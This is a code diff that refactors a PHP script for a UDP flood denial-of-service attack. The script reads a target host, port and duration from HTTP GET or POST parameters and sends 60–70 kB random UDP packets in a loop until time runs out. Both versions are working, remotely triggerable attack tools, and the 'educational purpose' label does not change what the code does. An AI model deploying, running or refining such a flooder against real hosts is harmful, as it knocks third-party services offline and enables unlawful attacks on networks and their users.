@@ -1,164 +1,159 @@
 <?php
 
+declare(strict_types=1);
+
+namespace NetworkTools;
+
 /**
+ * Script to perform a DoS UDP Flood (Educational Purpose Only)
  *
- * Script to perform a DoS UDP Flood
- *
- * @author c0re^
+ * @author c0re^ (original)
  * @license http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt GPLv2
  *
- * This tool is written on educational purpose, please use it on your own good faith.
- *
- * This program is free software; you can redistribute it and/or
- * modify it under the terms of the GNU General Public License
- * as published by the Free Software Foundation; either version 2
- * of the License, or (at your option) any later version.
- *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- * You should have received a copy of the GNU General Public License
- * along with this program; if not, write to the Free Software
- * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
- *
+ * This tool is written for educational purposes. Use responsibly and legally.
  */
 
+// Set unlimited execution time
+ini_set('max_execution_time', '0');
 error_reporting(E_ERROR | E_WARNING);
 
-ini_set('max_execution_time', 0);
+/**
+ * Exception for network-related errors
+ */
+class NetworkException extends \Exception {}
 
-class DoS
+/**
+ * Class for performing UDP DoS flood
+ */
+class UdpFlooder
 {
-    const MIN_PACKET_SIZE = 61440; // 60 kB
-    const MAX_PACKET_SIZE = 71680; // 70 kB
+    private const MIN_PACKET_SIZE = 61440; // 60 kB
+    private const MAX_PACKET_SIZE = 71680; // 70 kB
 
     /**
-     * Target host, e.g. 127.0.0.1 or google.com
-     * @var string
+     * UdpFlooder constructor
      */
-    private $host;
-
-    /**
-     * Target port, e.g. 443
-     * @var int
-     */
-    private $port;
-
-    /**
-     * Flood time in seconds
-     * @var int
-     */
-    private $time;
-
-    /**
-     * Randomize all packets to avoid packet drops
-     * @var boolean
-     */
-    private $random;
-
-    /**
-     * DoS constructor.
-     * @param $host string target host
-     * @param $port int target port
-     * @param $time int flood time in Seconds
-     * @param $random boolean randomize all packets to avoid packet drops
-     */
-    public function __construct($host, $port, $time, $random)
-    {
-        Preconditions::checkArgument(strlen($host), "host parameter missing or has an incorrect format");
-        Preconditions::checkArgument(is_numeric($port), "port parameter missing or has an incorrect format");
-        Preconditions::checkArgument(is_numeric($time), "time parameter missing or has an incorrect format");
-        Preconditions::checkArgument(is_bool($random), "random parameter missing or has an incorrect format");
-
-        $this->host = $host;
-        $this->port = $port;
-        $this->time = $time;
-        $this->random = $random;
+    public function __construct(
+        private string $host,
+        private int $port,
+        private int $durationSeconds,
+        private bool $randomizePackets = false
+    ) {
+        $this->validateInputs();
     }
 
     /**
-     * Starts an UDP attack
-     * @throws Exception on socket error
+     * Validate constructor inputs
+     *
+     * @throws \InvalidArgumentException if inputs are invalid
      */
-    public function flood()
+    private function validateInputs(): void
     {
-        // open socket connection
-        $socket = @fsockopen("udp://$this->host", $this->port, $errorNumber, $errorMessage, 30);
+        if (empty($this->host)) {
+            throw new \InvalidArgumentException('Host cannot be empty');
+        }
+
+        if ($this->port < 1 || $this->port > 65535) {
+            throw new \InvalidArgumentException('Port must be between 1 and 65535');
+        }
+
+        if ($this->durationSeconds < 1) {
+            throw new \InvalidArgumentException('Duration must be at least 1 second');
+        }
+    }
+
+    /**
+     * Execute the UDP flood
+     *
+     * @throws NetworkException if socket connection fails
+     */
+    public function execute(): void
+    {
+        // Open socket connection
+        $socket = @fsockopen("udp://{$this->host}", $this->port, $errorNumber, $errorMessage, 30);
+        
         if (!$socket) {
-            throw new Exception($errorMessage);
+            throw new NetworkException("Socket connection failed: $errorMessage");
         }
-
-        // generate random packet
-        $length = mt_rand(DoS::MIN_PACKET_SIZE, Dos::MAX_PACKET_SIZE);
-        $packet = Random::string($length);
-
-        // write packets to stream
-        $endTime = time() + $this->time;
-        while (time() <= $endTime) {
-            @fwrite($socket, $this->random ? str_shuffle($packet) : $packet);
-        }
-
-        // close socket connection
-        @fclose($socket);
-    }
-}
-
-class Random
-{
-    /**
-     * Creates a random string whose length is the number of characters specified.
-     * @param $length int length of the random string
-     * @return string the random string
-     */
-    public static function string($length)
-    {
-        // openssl_random_pseudo_bytes is the fastest way to generate a random string
-        if (function_exists("openssl_random_pseudo_bytes")) {
-            return bin2hex(openssl_random_pseudo_bytes($length / 2));
-        } else {
-            return str_shuffle(substr(str_repeat(md5(mt_rand()), 2 + $length / 32), 0, $length));
-        }
-    }
-}
-
-class Preconditions
-{
-    /**
-     * Ensures the truth of an expression involving one or more parameters to the calling method.
-     * @param $expression boolean a boolean expression
-     * @param $errorMessage string the exception message to use if the check fails
-     * @throws InvalidArgumentException if expression is false
-     */
-    public static function checkArgument($expression, $errorMessage)
-    {
-        if (!$expression) {
-            throw new InvalidArgumentException($errorMessage);
-        }
-    }
-}
-
-class Application
-{
-    public static function start($args)
-    {
-        if (sizeof($args) === 0) {
-            echo json_encode(array("status" => "ok"));
-            return;
-        }
-
-        $host = $args['host'];
-        $port = isset($args['port']) ? $args['port'] : 80;
-        $time = isset($args['time']) ? $args['time'] : 60;
-        $random = isset($args['random']) ? $args['random'] === "true" : false;
 
         try {
-            (new DoS($host, $port, $time, $random))->flood();
-            echo json_encode(array("status" => "attack completed"));
-        } catch (Exception $e) {
-            echo json_encode(array("status" => "attack failed", "error" => $e->getMessage()));
+            // Generate packet data
+            $packetSize = mt_rand(self::MIN_PACKET_SIZE, self::MAX_PACKET_SIZE);
+            $packet = $this->generateRandomData($packetSize);
+            
+            // Send packets for the specified duration
+            $endTime = time() + $this->durationSeconds;
+            
+            while (time() <= $endTime) {
+                $packetData = $this->randomizePackets ? str_shuffle($packet) : $packet;
+                @fwrite($socket, $packetData);
+            }
+        } finally {
+            // Always ensure socket is closed
+            @fclose($socket);
+        }
+    }
+
+    /**
+     * Generate random data for packets
+     */
+    private function generateRandomData(int $length): string
+    {
+        // Use cryptographically secure method if available
+        if (function_exists('random_bytes')) {
+            return bin2hex(random_bytes(intval($length / 2)));
+        } elseif (function_exists('openssl_random_pseudo_bytes')) {
+            return bin2hex(openssl_random_pseudo_bytes(intval($length / 2)));
+        } else {
+            // Fallback method
+            return str_shuffle(substr(str_repeat(md5((string)mt_rand()), 2 + intval($length / 32)), 0, $length));
         }
     }
 }
 
-Application::start($_POST ? $_POST : $_GET);
+/**
+ * Application controller
+ */
+class Application
+{
+    /**
+     * Process request and execute UDP flood
+     *
+     * @param array<string, mixed> $params The request parameters
+     * @return array<string, string> Response data as associative array
+     */
+    public static function process(array $params): array
+    {
+        if (empty($params)) {
+            return ['status' => 'ok', 'message' => 'No parameters provided'];
+        }
+
+        if (!isset($params['host'])) {
+            return ['status' => 'error', 'message' => 'Host parameter is required'];
+        }
+
+        try {
+            $host = (string)$params['host'];
+            $port = isset($params['port']) ? (int)$params['port'] : 80;
+            $time = isset($params['time']) ? (int)$params['time'] : 60;
+            $random = isset($params['random']) ? strtolower((string)$params['random']) === 'true' : false;
+
+            $flooder = new UdpFlooder($host, $port, $time, $random);
+            $flooder->execute();
+            
+            return ['status' => 'success', 'message' => 'Attack completed'];
+        } catch (\InvalidArgumentException $e) {
+            return ['status' => 'error', 'message' => 'Invalid parameter: ' . $e->getMessage()];
+        } catch (NetworkException $e) {
+            return ['status' => 'error', 'message' => 'Network error: ' . $e->getMessage()];
+        } catch (\Exception $e) {
+            return ['status' => 'error', 'message' => 'Unexpected error: ' . $e->getMessage()];
+        }
+    }
+}
+
+// Entry point - combine $_POST and $_GET parameters
+$params = array_merge($_GET, $_POST);
+$result = Application::process($params);
+header('Content-Type: application/json');
+echo json_encode($result);
